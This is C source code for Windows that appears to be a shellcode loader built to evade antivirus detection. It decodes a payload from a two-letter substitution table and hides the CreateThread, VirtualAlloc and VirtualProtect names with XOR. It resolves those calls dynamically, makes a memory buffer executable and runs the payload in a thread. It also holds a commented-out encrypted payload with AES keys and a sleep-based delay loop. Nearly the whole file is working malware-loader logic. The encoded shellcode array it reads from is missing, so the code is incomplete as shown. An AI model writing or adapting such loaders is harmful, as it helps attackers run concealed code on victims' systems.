#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <time.h>


//unsigned char calc_payload[] = { 0x3f, 0xb8, 0x23, 0x63, 0xfa, 0x62, 0xf2, 0xa9, 0x8f, 0x47, 0xbc, 0xb7, 0xf6, 0x5, 0xf1, 0xa7, 0x55, 0x4d, 0xca, 0x51, 0x84, 0x21, 0xa4, 0xd0, 0x1e, 0xc6, 0x7e, 0x13, 0x14, 0x9e, 0xd7, 0x2a, 0xae, 0xd3, 0x99, 0xc1, 0x81, 0xa8, 0xdd, 0xb6, 0x1a, 0x30, 0x92, 0x6b, 0x92, 0x5b, 0x31, 0x3b, 0x91, 0xfb, 0xbe, 0xa1, 0xd6, 0x4d, 0x41, 0x81, 0x66, 0x9d, 0xcd, 0x97, 0xea, 0x96, 0xcb, 0x89, 0x63, 0x83, 0x2, 0x8a, 0x86, 0xd7, 0xb2, 0x8d, 0x32, 0x6d, 0x53, 0xd0, 0xb, 0x80, 0xa3, 0xb6, 0x14, 0x17, 0x66, 0xe0, 0xde, 0x45, 0x47, 0x3a, 0xbe, 0xa4, 0xde, 0x63, 0xe, 0xd6, 0x19, 0xfd, 0xeb, 0xf1, 0xa9, 0x1a, 0x6a, 0x5e, 0xd, 0x3e, 0xd7, 0x77, 0xa5, 0x47, 0x32, 0xa0, 0x48, 0xdb, 0xb3, 0x49, 0x59, 0x92, 0x26, 0xc0, 0xb0, 0x46, 0x46, 0x3f, 0x95, 0x9d, 0xf, 0x63, 0x5e, 0x1f, 0xe5, 0x79, 0x26, 0x88, 0xb4, 0xda, 0x6e, 0xac, 0x2e, 0xe9, 0xa7, 0x50, 0x1d, 0x6d, 0xa4, 0x87, 0x73, 0xf8, 0x1, 0xf8, 0x34, 0xf7, 0xa1, 0xf, 0x1c, 0x39, 0x92, 0x3, 0xe3, 0xe, 0x4d, 0xc4, 0x6f, 0x41, 0x55, 0xef, 0xd9, 0x57, 0xb2, 0xfc, 0x67, 0xbc, 0xc8, 0xf5, 0x14, 0x18, 0xc, 0xf3, 0xfe, 0xbe, 0x19, 0x2c, 0xb4, 0x6e, 0x98, 0x2a, 0xf5, 0x6d, 0xd6, 0x5b, 0x4, 0x2, 0x9a, 0x6c, 0xc6, 0x1d, 0x6a, 0x10, 0x92, 0x29, 0xc, 0x1e, 0x74, 0x4d, 0x5c, 0x97, 0xc3, 0xd6, 0xed, 0x32, 0x76, 0x2a, 0xc, 0x33, 0xed, 0xab, 0x6b, 0x91, 0xc0, 0x80, 0x90, 0xaf, 0x9b, 0x47, 0x1f, 0x89, 0xdc, 0xe, 0xe0, 0xbe, 0x98, 0x44, 0xa8, 0xea, 0x1f, 0x2e, 0xba, 0xc5, 0xd9, 0xe4, 0x17, 0x9c, 0x55, 0x92, 0x41, 0xaa, 0x91, 0xee, 0xe3, 0x4d, 0x63, 0x5c, 0x8d, 0xc, 0xe7, 0x81, 0x87, 0x71, 0xf2, 0x13, 0xac, 0x8e, 0x14, 0x3e, 0x3a, 0xb2, 0x8f, 0xdc, 0xc0, 0x63, 0x9, 0xc3, 0x70, 0x6e, 0x39, 0x2b, 0xc6, 0xf5, 0x9d, 0x82, 0xe5, 0x79, 0x82, 0xad, 0x90, 0xeb, 0xdd, 0x36, 0xa1, 0xb5 };



//unsigned int calc_len = sizeof(calc_payload);

void DeepDream(int * num2) {
	int num1, flag_var, i, j, delta;
	int ctr;
	num1 = 1;
	delta = 1;
	//num2 = 1000000;
	time_t t;   // not a primitive datatype
    time(&t);
    //printf("\nStarting prime factorization at: %s", ctime(&t));
	
	for(i=num1+1; i<num2; ++i)
	{
	flag_var=0;
	for(j=2; j<=i/2; ++j)
	{
		if(i%j==0)
		{
			flag_var=1;
			break;
		}
	}
	if(flag_var==0)
		delta += 1;
		Sleep(1);
		//printf("%d\n",i);
	}
	time(&t);
    //printf("\nEnding prime factorization at: %s", ctime(&t));
}

void TotesMaGoats(char * ciphertext, size_t ciphertext_len, char * key, size_t key_len) {
	int myByte;
	//int k;
	//int l;
	//int m;
	
	myByte = 0;
	for (int idx = 0;  idx < ciphertext_len; idx++) {
		int k_minus_one = key_len - 1;
		//l = 1;
		//m = 0;
		if (myByte == k_minus_one) myByte = 0;
		//m = k + l;

		ciphertext[idx] = ciphertext[idx] ^ key[myByte];
		//l = m + k;
		myByte++;	
	}
}


int main(void) {



unsigned char translation_table[][256] = { "fq","kx","qp","ys","oc","ar","bj","ki","oq","py","fb","if","at","au","ox","cz","mk","mu","pc","ha","lr","yq","av","iu","xq","tg","rt","xx","ft","wu","gc","ec","yb","lp","wd","jv","ab","kq","jh","ak","be","sx","iz","bm","hi","hn","wp","yr","tb","rw","yv","ly","mp","vm","cc","ht","zw","jb","bg","hu","sl","ra","kj","xm","lg","ph","fr","op","fl","zi","ej","mh","ta","sv","uh","tl","kw","ee","cw","bl","ac","ym","ri","zy","ao","zu","hc","pn","dn","km","ke","ga","vd","lu","vg","qu","jq","kl","ln","re","uc","cr","jf","pu","da","wk","nh","tv","jy","aq","fd","eo","md","pa","gt","ap","wl","qd","hx","ff","jn","rm","zv","pz","ll","ja","kh","gb","rv","jw","ui","mv","lm","oj","ld","iw","vx","tz","uu","vw","uy","ei","wz","cs","ql","rc","la","fa","vn","xj","ty","xh","ow","fu","nw","nk","ud","qi","hd","dm","ce","bc","bq","kd","mc","lc","wx","yx","ur","gf","mn","ho","pq","ip","tr","ls","er","lo","yn","en","ad","cy","wa","js","pd","he","cl","tn","qf","kb","va","tx","lz","kk","fh","xb","ic","dz","se","om","on","tf","su","uj","ti","tk","cq","wb","xi","ba","fw","wc","ww","yz","ms","rb","bu","iy","xv","wj","mi","cx","gg","ds","or","fg","yp","hk","lq","ry","ey","et","fp","jx","gh","vc","gs","cn","za","ru","yj","de","hr","aj","ob","jd","ib","xz","wf","dl","ew","pj","lk","lf","lb","hm" };
unsigned char shellcode[265731];

	/*
	 for loop is defined as such:
          for (int sc_index = 0; sc_index <= # of shelcode bytes; sc_index++)
	*/
	for (int sc_index = 0; sc_index <= 265731; sc_index++) {
	//for (int sc_index = 0; sc_index <= 287; sc_index++) {
		for (int tt_index = 0; tt_index <= 255; tt_index++) {
			char translated_substring[2];
			translated_substring[0] = translated_shellcode[sc_index][0];
			translated_substring[1] = translated_shellcode[sc_index][1];
			if (strcmp(translation_table[tt_index], translated_substring) == 0) {
			//if (strcmp(translation_table[tt_index], translated_shellcode[sc_index]) == 0) {
				//printf("translated substring: %s\n", translated_substring);
				//printf("translated_shellcode: %s\n", translated_shellcode[sc_index]);
				//printf("translation table entry: %d\n", tt_index);
				//printf("Shellcode byte: %x\n", translated_shellcode[sc_index]);
				shellcode[sc_index] = tt_index;
				//printf("sc_index: %d\n", sc_index);
				//printf("tt_index: %d\n", tt_index);
				break;
			}
		}
	}
	
	int sc_len = sizeof(shellcode);

	//printf("[-] Beginning program execution\n");
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD op = 0;
	
    char xorkey[] = "R3dS13g3";
    char sCreateThread[] = { 0x11, 0x41, 0x1, 0x32, 0x45, 0x56, 0x33, 0x5b, 0x20, 0x56, 0x5, 0x37, 0x00 };
	char sVirtualAlloc[] = { 0x4, 0x5a, 0x16, 0x27, 0x44, 0x52, 0xb, 0x72, 0x3e, 0x5f, 0xb, 0x30, 0x00 };
	char sVP[] = { 0x4, 0x5a, 0x16, 0x27, 0x44, 0x52, 0xb, 0x63, 0x20, 0x5c, 0x10, 0x36, 0x52, 0x47, 0x00 };
    char sK32[] = { 0x39, 0x56, 0x16, 0x3d, 0x54, 0x5f, 0x54, 0x1, 0x7c, 0x57, 0x8, 0x3f, 0x00 };
	
	//printf("[-] Decrypting strings\n");
	TotesMaGoats((char *) sCreateThread, strlen(sCreateThread), xorkey, sizeof(xorkey));
	TotesMaGoats((char *) sVirtualAlloc, strlen(sVirtualAlloc), xorkey, sizeof(xorkey));
	TotesMaGoats((char *) sVP, strlen(sVP),xorkey, sizeof(xorkey));
	TotesMaGoats((char *) sK32, strlen(sK32), xorkey, sizeof(xorkey));

	//printf("[-] Resolving addresses\n");
	// Resolve the address of CreateThread
	FARPROC pCreateThread = GetProcAddress(GetModuleHandle(sK32), sCreateThread);
	FARPROC pVirtualAlloc = GetProcAddress(GetModuleHandle(sK32), sVirtualAlloc);
	FARPROC pVirtualProtect = GetProcAddress(GetModuleHandle(sK32), sVP);
	
	//char AESkey[] = { 0x9c, 0x5e, 0x86, 0x42, 0x29, 0xf, 0x4f, 0xf7, 0xa6, 0xb2, 0x3a, 0x50, 0xf8, 0xa9, 0xa0, 0x6e };
	//char AESkey[] = { 0xe3, 0xef, 0x25, 0x73, 0x5, 0x12, 0x2d, 0x3, 0xe1, 0x8e, 0x56, 0x1e, 0x1e, 0x28, 0xa2, 0xcb };
	// Decrypt payload
	//AESDecrypt((char *) calc_payload, calc_len, AESkey, sizeof(AESkey));


	printf("[-] Allocating memory\n");	
	// Allocate buffer for payload
	exec_mem = pVirtualAlloc(0, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "shellcode addr", (void *)shellcode);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
	printf("shellcode length: %d\n", sc_len);


	//TotesMaGoats((char *) calc_payload, calc_len, xorkey, sizeof(xorkey));
	printf("[-] Copying shellcode\n");
	// Copy payload to the buffer
	RtlMoveMemory(exec_mem, shellcode, sc_len);
	
	printf("[-] Making buffer executable\n");
	// Make the buffer executable
	//rv = pixel(exec_mem, calc_len, PAGE_EXECUTE_READ, &op);
	//rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &op);
	rv = pVirtualProtect(exec_mem, sc_len, PAGE_EXECUTE_READ, &op);

	printf("\nHit me!\n");
	getchar();
	//DeepDream(500);
	printf("[-] Executing thread\n");

	// If all good, run the payload
	if ( rv != 0 ) {
			th = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}




	
	//unsigned int tt_len = 0;
	//unsigned int sc_len = 0;

	//tt_len = sizeof(translation_table);
	//sc_len = sizeof(shellcode);
	
	//printf("translation_table length: %d\n", tt_len);
	//printf(translation_table[0]);
	/*for (int tt_idx = 0; tt_idx <= 257; tt_idx++) {
		printf("tt_idx: %d, tt_entry: %s\n", tt_idx,translation_table[tt_idx]);
		//printf("tt entry: %s\n", translation_table[tt_idx]);
	}*/
	//int index = -1;
	/*for (int index = 0; index <= 256; index++) {
		if (strcmp(translation_table[index], "mixed") == 0) {
			translated_shellcode[i] = i;
			break;
		}
	}*/
	
	
	
	//printf("Index of shops is: %d\n", index);
	//printf("shelcode length: %d\n", sc_len);

	return 0;
}